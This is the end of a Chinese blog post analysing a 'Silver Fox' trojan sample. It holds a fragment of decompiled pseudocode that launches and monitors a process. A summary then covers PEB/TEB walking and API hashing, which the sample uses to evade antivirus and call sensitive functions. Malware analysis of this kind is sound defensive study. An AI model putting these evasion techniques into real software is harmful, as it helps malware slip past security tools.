class="number">64</span>);</span><br><span class="line">    ProcessInformation = <span class="number">0</span>i64;</span><br><span class="line">    <span class="keyword">if</span> ( !CreateProcessW(<span class="number">0</span>, CommandLine, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x8000000</span>u, <span class="number">0</span>, <span class="number">0</span>, &amp;StartupInfo, &amp;ProcessInformation) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    WaitForSingleObject(ProcessInformation.hProcess, <span class="number">0x1388</span>u);</span><br><span class="line">    ExitCode = <span class="number">0</span>;</span><br><span class="line">    GetExitCodeProcess(ProcessInformation.hProcess, &amp;ExitCode);</span><br><span class="line">    CloseHandle(ProcessInformation.hProcess);</span><br><span class="line">    CloseHandle(ProcessInformation.hThread);</span><br><span class="line">    <span class="keyword">if</span> ( ExitCode )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_10001040(v10, <span class="number">128</span>, &amp;unk_10020E30, ExitCode);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">    &#125;</span><br><span class="line">    Sleep(<span class="number">0xBB8</span>u);</span><br><span class="line">    <span class="keyword">if</span> ( !sub_100011A0(WideCharStr) )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = &amp;unk_10020F64;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_12:</span><br><span class="line">    Sleep(<span class="number">0x3E8</span>u);</span><br><span class="line">  &#125;</span><br><span class="line">  LastError = GetLastError();</span><br><span class="line">  sub_10001040(v10, <span class="number">128</span>, &amp;unk_10020E58, LastError);</span><br><span class="line">LABEL_16:</span><br><span class="line">  sub_10001080(v10);</span><br><span class="line">  v5 = &amp;unk_10020F90;</span><br><span class="line">LABEL_17:</span><br><span class="line">  sub_10001080(v5);</span><br><span class="line">  sub_10001270();</span><br><span class="line">  result = hObject;</span><br><span class="line">  <span class="keyword">if</span> ( hObject )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (HANDLE)CloseHandle(hObject);</span><br><span class="line">    hObject = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过这次跟着大佬的帖子分析这个银狐木马，学习到好多之前没有了解过或者已经忘记了的技能知识。</p>
<ul>
<li><strong>如果有动调的环境，一定要配合静态分析使用！！！</strong>（这个深有体会，纯静态分析看得非常累，很多东西要么靠经验猜测，要么只能跟着大佬的帖子走；手搓脚本跟静态分析一样累，还要处理很多看不到的问题，浪费时间）</li>
<li>学习了 PE 结构体的内容，其中“定位导出表”更是手动分析了好几次，印象深刻。</li>
<li>学习了有关 <code>TEB</code> 和 <code>PEB</code> 的内容，了解了 windows 下的 <code>fs</code> &#x2F; <code>gs</code> 段寄存器的作用，也了解了如何通过这两个结构体指针找到进程中的某个已加载模块，从而规避杀毒软件的检测，调用敏感函数。（这一个知识点印象深刻）</li>
<li>由于没有动调环境，所以尝试手搓了好几个脚本，其中包括通过哈希查找函数名和函数地址的脚本。这个脚本一开始还运行不太正常，后面了解到是因为把导出表中的一些<strong>转发器函数</strong>也计算出来了，导致最后得到的函数数量和 <code>kernel32.dll</code> 中的 <code>NumberOfNames</code> 结果对不上。（这个以后也要稍微学习一下）</li>
</ul>

      
    </div><!-- .entry-content -->

    <footer class="entry-meta">
    <a href="/2025/12/07/%E8%B7%9F%E7%9D%8052pojie%E5%A4%A7%E4%BD%AC%E5%88%86%E6%9E%90%E4%B8%80%E4%BB%BD%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC/">
    <time datetime="2025-12-07T15:58:36.000Z" class="entry-date">
        2025-12-07
    </time>
</a>
    
  <span class="article-delim">&#8226;</span>
  <div class="article-category">
  <a class="article-category-link" href="/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88windows%EF%BC%89/">恶意代码分析（windows）</a>
  </div>

    
    </footer>
</article>


    
<nav class="nav-single">
    <h3 class="assistive-text">文章导航</h3>
    
    
        <span class="nav-next"><a href="/2025/10/28/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B-cardmaster/" rel="next">2024网鼎杯半决赛 cardmaster <span class="meta-nav">→</span></a></span>
    
</nav><!-- .nav-single -->







</div></div>
        <div id="secondary" class="widget-area" role="complementary">
  
    <aside id="search" class="widget widget_search"><form role="search" method="get" accept-charset="utf-8" id="searchform" class="searchform" action="//google.com/search">
    <div>
        <input type="text" value="" name="s" id="s" />
        <input type="submit" id="searchsubmit" value="搜索" />
    </div>
</form></aside>
  
    
  
    
  <aside class="widget">
    <h3 class="widget-title">Categories</h3>
    <div class="widget-content">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/ctf%E6%99%AE%E9%80%9A/">ctf普通</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/windows-%E7%9B%B8%E5%85%B3/">windows 相关</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88windows%EF%BC%89/">恶意代码分析（windows）</a><span class="category-list-count">1</span></li></ul>
    </div>
  </aside>

  
    
  <aside class="widget">
    <h3 class="widget-title">Recents</h3>
    <div class="widget-content">
      <ul>
        
          <li>
            <a href="/2025/12/07/%E8%B7%9F%E7%9D%8052pojie%E5%A4%A7%E4%BD%AC%E5%88%86%E6%9E%90%E4%B8%80%E4%BB%BD%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC/">跟着52pojie大佬分析一份木马样本</a>
          </li>
        
          <li>
            <a href="/2025/10/28/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B-cardmaster/">2024网鼎杯半决赛 cardmaster</a>
          </li>
        
          <li>
            <a href="/2025/10/20/windows-%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/">windows 重定位简单学习</a>
          </li>
        
          <li>
            <a href="/2025/07/29/cve-2025-6218-winrar%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">cve-2025-6218 winrar目录遍历漏洞复现与简单分析</a>
          </li>
        
          <li>
            <a href="/2024/11/27/gdbserver-%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E5%B0%8F%E6%80%BB%E7%BB%93/">gdbserver 远程调试小总结</a>
          </li>
        
      </ul>
    </div>
  </aside>

  
    
  
    
  
</div>
      </div>
      <footer id="colophon" role="contentinfo">
    <!-- <p>&copy; 2025 shanza
    All rights reserved.</p> -->
    <p>&copy; 2025 shanza
    ❤️ Hor1zon</p>
    <p>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></p>
</footer>
    <script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"1","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/js/share.js'];</script>

<script src="/js/jquery-3.3.1.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>


<script src="/js/navigation.js"></script>

<div id="bg"></div>

  </div>
</body>
</html>